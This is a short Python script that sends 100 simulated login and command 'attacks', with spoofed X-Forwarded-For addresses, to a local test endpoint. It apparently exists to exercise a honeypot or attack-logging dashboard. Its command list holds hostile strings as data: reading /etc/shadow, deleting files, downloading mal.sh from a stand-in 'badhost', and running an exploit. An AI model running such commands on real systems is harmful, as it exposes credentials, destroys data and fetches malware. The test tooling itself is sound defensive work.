import requests
import random
import string
import time

API_URL = "http://localhost:5000/api/simulated-attack"

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_ip():
    return f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# Expand pools with more randomness
base_usernames = ["admin", "root", "user", "test", "service", "dev", "scan", "bot"]
usernames = [f"{u}{random.randint(1, 999)}" for u in base_usernames] + [random_string(6) for _ in range(30)]

base_passwords = ["admin", "password", "guest", "qwerty", "123456"]
passwords = [f"{p}{random.randint(100, 9999)}" for p in base_passwords] + [random_string(8) for _ in range(30)]

commands = [
    "ls", "cat /etc/shadow", "touch hacked.txt", "rm -rf /tmp/*",
    "wget http://badhost/mal.sh", "curl ifconfig.me", "python3 exploit.py",
    "whoami", "nmap -Pn 10.0.0.0/24", "echo test", "uname -a", "cd /var && ls"
]

# Send 100 unique attacks
for i in range(100):
    attack_type = random.choice(["login", "command", "both"])
    attack_data = {
        "username": random.choice(usernames) if attack_type in ["login", "both"] else "",
        "password": random.choice(passwords) if attack_type in ["login", "both"] else "",
        "command": random.choice(commands) if attack_type in ["command", "both"] else ""
    }

    spoofed_ip = generate_ip()
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": spoofed_ip
    }

    try:
        response = requests.post(API_URL, json=attack_data, headers=headers)
        print(f"[{i+1}/100] IP: {spoofed_ip} | Sent: {attack_data} | {response.json().get('message')}")
    except Exception as e:
        print(f"[ERROR] Failed to send attack #{i+1}: {e}")

    time.sleep(0.2)
